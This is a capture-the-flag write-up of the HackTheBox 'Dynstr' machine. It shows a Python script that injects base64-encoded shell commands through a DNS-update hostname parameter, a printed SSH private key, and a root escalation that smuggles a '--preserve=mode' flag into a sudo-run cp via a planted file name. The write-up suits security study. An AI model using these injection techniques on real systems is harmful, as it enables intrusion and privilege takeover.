# Dynstr

## Credentials

Untitled Database

## Enumeration

### Nmap scan

```bash
# Nmap 7.91 scan initiated Tue Jul 13 06:10:11 2021 as: nmap -p22,53,80 -sV -sC -oA nmap/detailed 10.10.10.244
Nmap scan report for 10.10.10.244
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
# Nmap done at Tue Jul 13 06:10:27 2021 -- 1 IP address (1 host up) scanned in 15.88 seconds

```

### WebServer

On website was some dns records and shared credentials as well as domain from e-mail address.

<figure><img src="../../.gitbook/assets/Pasted_image_20210713121254 (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Pasted_image_20210713121414.png" alt=""><figcaption></figcaption></figure>

### Fuzzing directories

```bash
└─[$] ffuf -u '<http://dyna.htb/FUZZ>' -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
        /'___\\  /'___\\           /'___\\
       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/
       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\
        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/
         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\
          \\/_/    \\/_/   \\/___/    \\/_/
       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : <http://dyna.htb/FUZZ>
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

assets                  [Status: 301, Size: 305, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10]
                        [Status: 200, Size: 10909, Words: 1937, Lines: 282]
nic                     [Status: 301, Size: 302, Words: 20, Lines: 10]
                        [Status: 200, Size: 10909, Words: 1937, Lines: 282]
:: Progress: [62283/62283] :: Job [1/1] :: 916 req/sec :: Duration: [0:01:11] :: Errors: 3 ::

└─[$] ffuf -u '<http://dyna.htb/nic/FUZZ>' -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt

        /'___\\  /'___\\           /'___\\
       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/
       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\
        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/
         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\
          \\/_/    \\/_/   \\/___/    \\/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : <http://dyna.htb/nic/FUZZ>
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

update                  [Status: 200, Size: 8, Words: 1, Lines: 2]
                        [Status: 200, Size: 0, Words: 1, Lines: 1]
                        [Status: 200, Size: 0, Words: 1, Lines: 1]
:: Progress: [62283/62283] :: Job [1/1] :: 40 req/sec :: Duration: [0:01:11] :: Errors: 3 ::

```

And endpoint `/nic/update` returned `badauth` when accessed

## Remote Code Execution

### Proof of Concept

```bash
curl "<http://dynadns:sndanyd@dyna.htb/nic/update?hostname=as'df.dnsalias.htb>"
911 [nsupdate failed]

```

Error message showing that `nsupdate` failed `nsupdate` is shell utility that could be used to update dynamic DNS records. For this case it is possible to inject shell commands.

<figure><img src="../../.gitbook/assets/Pasted_image_20210713122203 (1).png" alt=""><figcaption></figcaption></figure>

This allowed to execute `ping` command to my local machine.

<figure><img src="../../.gitbook/assets/Pasted_image_20210713222221 (2).png" alt=""><figcaption></figcaption></figure>

### Exploit

```python
import requests
import base64
import argparse

parser = argparse.ArgumentParser(description="Just some funky automation")
parser.add_argument("--host", dest="host")
parser.add_argument("--payload", dest="payload")
parser.add_argument("--auth", dest="auth", help="String in format username:password")
args = parser.parse_args()

payload = base64.b64encode(args.payload.encode()).decode()

payload = {
    'hostname': f'$(echo "{payload}" | base64 -d | bash).dnsalias.htb'
        }

URL = f'http://{args.host}/nic/update'
auth = args.auth.strip().split(':')

r = requests.get(URL, params=payload, auth=(auth[0], auth[1]))

print(r.text)

```

This code snippet automate some of the process with login and encoding the payload.

With this reverse shell was spawned.

<figure><img src="../../.gitbook/assets/Pasted_image_20210713222759.png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Enumeration

User bindmgr can only connect if hi is connecting from domain `*.infra.dyna.htb`

<figure><img src="../../.gitbook/assets/Pasted_image_20210713223727.png" alt=""><figcaption></figcaption></figure>

In addition `linpeas.sh` found possible private ssh keys

```
/home/bindmgr/support-case-C62796521/strace-C62796521.txt
/home/bindmgr/support-case-C62796521/C62796521-debugging.script

```

Inside `strace-C62796521.txt` is indeed private key

<figure><img src="../../.gitbook/assets/Pasted_image_20210713224510.png" alt=""><figcaption></figcaption></figure>

And file `command-output-C62796521.txt` suggest that this is bindmgr key.

<figure><img src="../../.gitbook/assets/Pasted_image_20210713224442.png" alt=""><figcaption></figcaption></figure>

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1
42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3
HjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F
L6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn
UOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX
CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz
uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a
XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P
ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk
+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs
4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq
xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD
PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k
obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l
u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS
TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A
Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE
BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv
C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX
Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt
U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ
b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5
rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG
jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----

```

### Adding new DNS record to match key requirements

Inside the file `/var/www/html/nic/update` was adding and deleting the records this was used as example.

<figure><img src="../../.gitbook/assets/Pasted_image_20210713224738.png" alt=""><figcaption></figcaption></figure>

Inside the `/etc/bind` directory was file named `infra.key`

<figure><img src="../../.gitbook/assets/Pasted_image_20210713225654.png" alt=""><figcaption></figcaption></figure>

Command

```bash
www-data@dynstr:/var/www/html/nic$ nsupdate -k /etc/bind/infra.key
> update add soviet.infra.dyna.htb 86400 A 10.10.14.66
> send
> update add 66.14.10.10.in-addr.arpa 86400 PTR soviet.infra.dyna.htb
> send

```

First is needed to add main `A` record as for every `PTR` record need `A` record. The `A` record point `Domain Name/Hostname` to `IP` the `PTR` record is opposite it points `IP` to `Domain Name/Hostname`

* [A DNS Records explained](https://www.cloudns.net/wiki/article/10/)
* [PTR DNS Record Explained](https://www.cloudns.net/wiki/article/40/)



This allowed to login with obtained private key as `bindmgr user`

<figure><img src="../../.gitbook/assets/Pasted_image_20210713231627 (1).png" alt=""><figcaption></figcaption></figure>

### bindmgr

User `bindmgr` can run `/usr/local/bin/bindmgr.sh` as root without password

![](../../.gitbook/assets/Pasted\_image\_20210713232200.png)

Source of `bindmgr.sh`

```bash
#!/usr/bin/bash

# This script generates named.conf.bindmgr to workaround the problem
# that bind/named can only include single files but no directories.
#
# It creates a named.conf.bindmgr file in /etc/bind that can be included
# from named.conf.local (or others) and will include all files from the
# directory /etc/bin/named.bindmgr.
#
# NOTE: The script is work in progress. For now bind is not including
#       named.conf.bindmgr.
#
# TODO: Currently the script is only adding files to the directory but
#       not deleting them. As we generate the list of files to be included
#       from the source directory they won't be included anyway.

BINDMGR_CONF=/etc/bind/named.conf.bindmgr
BINDMGR_DIR=/etc/bind/named.bindmgr

indent() { sed 's/^/    /'; }

# Check versioning (.version)
echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
	echo "[-] ERROR: Check versioning. Exiting."
	exit 42
fi
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
	echo "[-] ERROR: Check versioning. Exiting."
	exit 43
fi

# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\\n' > $BINDMGR_CONF
for file in * ; do
	printf 'include "/etc/bind/named.bindmgr/%s";\\n' "$file" >> $BINDMGR_CONF
done

    # Stage new version of configuration files.
    echo "[+] Staging files to $BINDMGR_DIR."
    cp .version * /etc/bind/named.bindmgr/

    # Check generated configuration with named-checkconf.
    echo "[+] Checking staged configuration."
    named-checkconf $BINDMGR_CONF >/dev/null
    if [[ $? -ne 0 ]] ; then
	    echo "[-] ERROR: The generated configuration is not valid. Please fix following errors: "
	    named-checkconf $BINDMGR_CONF 2>&1 | indent
	    exit 44
    else
	    echo "[+] Configuration successfully staged."
	    # *** TODO *** Uncomment restart once we are live.
	    # systemctl restart bind9
	    if [[ $? -ne 0 ]] ; then
		    echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
		    systemctl status bind9
	    else
		    echo "[+] Restart of bind9 via systemctl succeeded."
	    fi
    fi

```

The vulnerable code is `cp .version * /etc/bind/named.bindmgr/` and this can be used to inject commands for example additional flags for the `cp` command Commands

```bash
bindmgr@dynstr:/tmp/soviet$ echo "2137" > .version #this is needed for the script to run
bindmgr@dynstr:/tmp/soviet$ cp /bin/bash soviet # Copied bash and renamed it to soviet
bindmgr@dynstr:/tmp/soviet$ chmod +s soviet # add setuid bit to the bash
bindmgr@dynstr:/tmp/soviet$ echo > "--preserve=mode" # this inject the --preserve flag with value mode and this prevents from dropping setuid bit
bindmgr@dynstr:/tmp/soviet$ sudo /usr/local/bin/bindmgr.sh # running script
```

<figure><img src="../../.gitbook/assets/Pasted_image_20210714001114.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/hacker_cat.gif" alt=""><figcaption></figcaption></figure>
